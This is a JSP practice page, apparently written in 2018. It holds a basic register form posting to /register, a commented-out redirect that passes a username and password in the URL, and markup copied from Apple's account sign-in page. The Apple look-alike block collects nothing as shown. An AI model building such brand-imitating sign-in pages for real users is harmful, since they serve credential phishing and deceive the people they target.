<%--
  Created by IntelliJ IDEA.
  User: pgxn
  Date: 2018/2/26
  Time: 19:02
  To change this template use File | Settings | File Templates.
--%>
<%@ page contentType="text/html;charset=UTF-8" language="java" %>
<%
    String path = request.getContextPath();
    String basePath = request.getScheme() + "://"
            + request.getServerName() + ":" + request.getServerPort()
            + path + "/";
%>
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
<html>
<head>
    <base href="<%=basePath%>">
    <title>My JSP 'index.jsp' starting page</title>
    <meta http-equiv="pragma" content="no-cache">
    <meta http-equiv="cache-control" content="no-cache">
    <meta http-equiv="expires" content="0">
    <meta http-equiv="keywords" content="keyword1,keyword2,keyword3">
    <meta http-equiv="description" content="This is my page">
    <!--
  <link rel="stylesheet" type="text/css" href="styles.css">
  -->
</head>
<body>
<!--这段代码可以自动进行跳转，实现get方法传递
<script type="text/javascript">
window.location.href = "registera?username=sa&password=123"
</script>
-->
<form action="/register" method="post">
    用户名： <input type="text" name="username"/> <br/>
    密码： <input type="password" name="password"/> <br/>
    <input type="submit" value="登陆"/>
</form>
<div id="step" class="si-step ">
    <div id="stepEl">
        <div class="signin fade-in" id="signin">
            <h1 class="si-container-title tk-intro "> Manage your Apple account </h1>
            <div class="container si-field-container  ">
                <div class="no-gutter si-field apple-id">
                    <div class="col-xs-12">
                        <span class="sr-only" id="appleIdFieldLabel">Manage your Apple account
                        </span>
                        <div class="ax-border apple-id ">
                            <input type="text" id="appleId"
                                   class="si-text-field form-textbox "
                            >
                        </div>
                    </div>
                </div>
                <div class="field-separator "></div>
                <div class="no-gutter si-field pwd">
                    <div class="col-xs-12">
                        <label for="pwd" class="sr-only"> Password </label>
                        <div class="ax-border pwd ">
                            <input type="password" id="pwd"
                                   class="si-password si-text-field   form-textbox">
                        </div>
                        <p class="sr-only" id="invalidUserNamePwdErrMsg">
                        </p>
                    </div>
                </div>
                <div class="si-remember-password">
                    <input type="checkbox" id="remember-me" class="form-choice form-choice-checkbox"
                    > <label id="remember-me-label" class="form-label"
                             for="remember-me"> <span
                        class="form-choice-indicator"></span> Remember me </label>
                </div>
                <div class="spinner-container auth  hide"></div>
                <button id="sign-in" tabindex="0"
                        class="si-button btn  disable   remember-me  ">
                    <i class="icon icon_sign_in"></i>
                    <span class="text feat-split">
                Sign In
            </span>
                </button>
                <button id="sign-in-cancel"
                        tabindex="0"
                        class="si-button btn secondary feat-split  remember-me  ">
                    <span class="text">Close</span>
                </button>
            </div>
        </div>
    </div>
</div>
</body>
</html>
